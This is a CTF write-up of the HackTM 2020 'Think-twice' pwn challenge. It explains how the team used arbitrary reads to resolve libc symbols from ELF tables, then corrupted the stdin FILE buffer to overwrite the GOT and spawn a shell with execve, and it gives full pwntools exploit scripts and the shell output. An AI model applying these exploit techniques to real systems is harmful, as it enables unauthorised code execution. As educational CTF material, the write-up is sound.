	---
title: Think-twice - HackTM 2020
date: 2020-02-04 13:00:00
categories:
  - Pwn 
  - linux
  - ELF
tags:
  - CTF
  - writeup
  - Pwn
---

Linux userpace exploitation by parsing ELF for symbol addresses with arbitary read
<!-- excerpt -->
**Challenge points**: 491
**No. of solves**: 14
**Solved by** : @sherl0ck, @slashb4sh

The challenge program is rather simple. You get infinite number of arbitary reads, and one arbitary write. The libc is not given and the path of the loader is specified as `./loader.so`, hinting that a custom libc and loader is used. This is confirmed as no libc version matches are found on [libc database search](https://libc.blukat.me/) with the leaks obtained from the server. 
A custom libc and loader means that we **cannot** get a shell by calling `system`. This is because the custom loader crashes when trying to load the libc of sh binary as the path to libc is specified as `/lib/x86_64-linux-gnu/libc.so.6` in the environmental variables. We have to call `execve` with 2nd and 3rd argument as `execve`.
With n number of arbitary reads we can actually parse symbol tables in the ELF structure of the libc to obtain the address of any function we want. This technique is explained with sample code in this [blogpost](https://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html). Using the sample code with some modifications we can obtain the address of any symbol like `system` or `execve`. Note that this step has to be done only once, we obtain the offset from the base then hardcode it in the final exploit.

Code for finding symbol address :
```python
from pwn import *

s=remote("138.68.67.161", 20004)

def findLibcBase(ptr):
   ptr &= 0xfffffffffffff000
   ptr = ptr-(0x69000) # offset found after running from 0
   while (leak(ptr, 4)) != "\x7fELF":
	ptr = ptr - 0x1000
   return ptr


wordSz = 8
hwordSz = 4
bits = 64
PIE = 0

def leak(addr,size=8):
	s.sendlineafter(" >",str(1))
	s.sendlineafter(" [#] Enter Where: ",str(addr))
	s.recvline()
	val = s.recv(size)
	return val

def findPhdr(addr):
   if bits == 32:
      e_phoff = u32(leak(addr + 0x1c, wordSz).ljust(4, '\0'))
   else:
      e_phoff = u64(leak(addr + 0x20, wordSz).ljust(8, '\0'))
   return e_phoff + addr

def findDynamic(Elf32_Phdr, moduleBase, bitSz):
   if bitSz == 32:
      i = -32
      p_type = 0
      while p_type != 2:
         i += 32
         p_type = u32(leak(Elf32_Phdr + i, wordSz).ljust(4, '\0'))
      return u32(leak(Elf32_Phdr + i + 8, wordSz).ljust(4, '\0')) + PIE
   else:
      i = -56
      p_type = 0
      while p_type != 2:
         i += 56
         p_type = u64(leak(Elf32_Phdr + i, hwordSz).ljust(8, '\0'))
      return u64(leak(Elf32_Phdr + i + 16, wordSz).ljust(8, '\0')) + PIE

def findDynTable(Elf32_Dyn, table, bitSz):
   p_val = 0
   if bitSz == 32:
      i = -8
      while p_val != table:
         i += 8
         p_val = u32(leak(Elf32_Dyn + i, wordSz).ljust(4, '\0'))
      return u32(leak(Elf32_Dyn + i + 4, wordSz).ljust(4, '\0'))
   else:
      i = -16
      while p_val != table:
         i += 16
         p_val = u64(leak(Elf32_Dyn + i, wordSz).ljust(8, '\0'))
      return u64(leak(Elf32_Dyn + i + 8, wordSz).ljust(8, '\0'))


def findSymbol(strtab, symtab, symbol, bitSz):
   if bitSz == 32:
      i = -16
      while True:
         i += 16
         st_name = u32(leak(symtab + i, 2).ljust(4, '\0'))
         if leak( strtab + st_name, len(symbol)+1 ).lower() == (symbol.lower() + '\0'):
            return u32(leak(symtab + i + 4, 4).ljust(4, '\0'))
   else:
      #i =0x17b8
      #i = 0x7f50 # system
      i = 0x8730 # execve
      while True:
         i += 24
         st_name = u64(leak(symtab + i, 4).ljust(8, '\0'))
         val = leak( strtab + st_name, len(symbol)).lower()
	 print val
	 print "i = " + hex(i)
         if val == (symbol.lower()):
            return u64(leak(symtab + i + 8, 8).ljust(8, '\0'))

puts_libc = 0
def lookup(symbol):

	global PIE
	PIE = 0

        libcBase = findLibcBase(puts_libc)
	log.info("Libc's base address:................... " + hex(libcBase))

	libcPhdr = findPhdr(libcBase)
	log.info("Libc's Program Header:................. " + hex(libcPhdr))

	PIE = libcBase
        libcDynamic = findDynamic(libcPhdr, libcBase, bits)
	log.info("Libc's _DYNAMIC Section:............... " + hex(libcDynamic))

	libcStrtab = findDynTable(libcDynamic, 5, bits)
	log.info("Libc's DT_STRTAB Table:................ " + hex(libcStrtab))

	libcSymtab = findDynTable(libcDynamic, 6, bits)
	log.info("Libc's DT_SYMTAB Table:................ " + hex(libcSymtab))

	symbolAddr = findSymbol(libcStrtab, libcSymtab, symbol, bits)
	log.success("%s loaded at address:.............. %s" % (symbol, hex(symbolAddr + libcBase)))
	log.info("Libc's base address:................... " + hex(libcBase))



puts_got = 0x0000000000601018
puts_libc = u64(leak(puts_got))
log.info("Puts @ " + hex((puts_libc)))
lookup("execve")

s.interactive()
```
The server times out after 1 minute. Within each step; finding the libc base, scanning symbol table, etc, the function breaks before finding the desired address, so the script is run again form where it broke, and initial values of iterative variables are hardcoded after each step to speed up the process and stay within the 1 minute time frame.

#### Exploitation
Now that we have the address of `system` and `execve` at `0x40010` and `0xb7e80` respectively, only thing left is to get a shell. No mitigations are enabled on the binary except NX.

```sh
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
So the GOT table is an attack vector. But which function's GOT entry should we overwrite with `system` ?. We don't control the first argument of any of the imported libc functions used in the binary and nothing much can be done with an `8-byte write`. We have to find a way to extend the write primitive. One idea was to overwrite `fflush` with the arbitary write code path `0x400A31`, so everytime `fflush` is called we get an arbitary write. This didn't work as expected as `scanf` and `printf` crashed due to unalligned stack. 

##### Exploit technique to get shell
We have the addresses of the file structure's of `stdin`, `stdout` and `stderr` in the bss section. Leak the address of `stdin` and overwrite `stdin->_IO_buf_base` with an address above GOT table. So in the next call to `scanf` we have large write to the GOT table.
We have to call `execve("/bin/sh",0,0)` and **not** system("/bin/sh") as system tries 
 After `scanf`, `fflush(stdout)` is called so we overwrite the GOT entry of `fflush` with `init_proc+21` and also overwrite `stdout` with pointer to "/bin/sh" in bss.
```
gdb-peda$ pd init_proc
Dump of assembler code for function init_proc:
   0x000000000040089b <+0>:	push   rbp
   0x000000000040089c <+1>:	mov    rbp,rsp
   0x000000000040089f <+4>:	mov    rax,QWORD PTR [rip+0x2007ea]        # 0x601090 <stdin@@GLIBC_2.2.5>
   0x00000000004008a6 <+11>:	mov    ecx,0x0
   0x00000000004008ab <+16>:	mov    edx,0x2
   0x00000000004008b0 <+21>:	mov    esi,0x0
   0x00000000004008b5 <+26>:	mov    rdi,rax
   0x00000000004008b8 <+29>:	call   0x400750 <setvbuf@plt>
   0x00000000004008bd <+34>:	mov    rax,QWORD PTR [rip+0x2007bc]        # 0x601080 <stdout@@GLIBC_2.2.5>
   0x00000000004008c4 <+41>:	mov    ecx,0x0
```
Why call `init_proc`?  Within `init_proc`, `setvbuf` is called,  which we overwrite with `execve`. At `flush(stdout)` first argument is a pointer to "/bin/sh" and the 3rd argument is a pointer to NULL, and jumping to `init_proc+21` sets the 2nd argument as NULL.

`execve` is successfully called with all arguemnts set.


Final exploit :
```python
from pwn import *

s=remote("138.68.67.161", 20004)

def leak(addr,size=8):
	s.sendlineafter(" >",str(1))
	s.sendlineafter(" [#] Enter Where: ",str(addr))
	s.recvline()
	val =  s.recv(size)
	return val

def write(where,what,val = 0):
	if (val == 1):
		s.sendlineafter(" >",str(3))
	else:
		s.sendlineafter(" >",str(2))
	s.sendlineafter(" [#] Enter Where: ",str(where))
	s.sendlineafter(" [#] Enter What: ",str(what))


ret = 0x000040092F
code_block = 0x000000000400A50
fflush_got = 0x000000000601050
puts_got = 0x0000000000601018
printf_got = 0x000000000601030
exit_got = 0x000000000601068
write_got = 0x000000000601020
codeBlock = 0x0000000400AA9

got_start = 0x000000000601000

stdin = u64(leak(0x601090))
log.info("stdin @ " + hex(stdin))
buf_base = stdin +0x38

puts_libc = u64(leak(puts_got))
libcBase = puts_libc-0x691c0
log.info("libc base @ " + hex(libcBase))
system = libcBase + 0x40010
execve = libcBase + 0xb7e80
log.info("execve @ " + hex(execve))

fake_got = "1\n" + "\x00"*6 + p64(0) + p64(ret)*8 +  p64(0x0000000004008B0) +p64(execve) +p64(ret)*2 + "/bin/sh\x00" + p64(0) + p64(0x601070)*6

write(buf_base , got_start)
s.sendlineafter(" >",fake_got)


s.interactive()
```

```bash
slashb4sh@ubuntu:~/HackTM/think-twice$ python exploit.py 
[+] Opening connection to 138.68.67.161 on port 20004: Done
[*] stdin @ 0x7f9b57cdc8c0
[*] libc base @ 0x7f9b57943000
[*] execve @ 0x7f9b579fae80
[*] Switching to interactive mode
$ ls
flag.txt
libc.so
loader.so
run.sh
think-speak
$ cat flag.txt
HackTM{th3_my5t3r13s_0f_th3_ELF_h4v3_b33n_r3v34l3d}
```
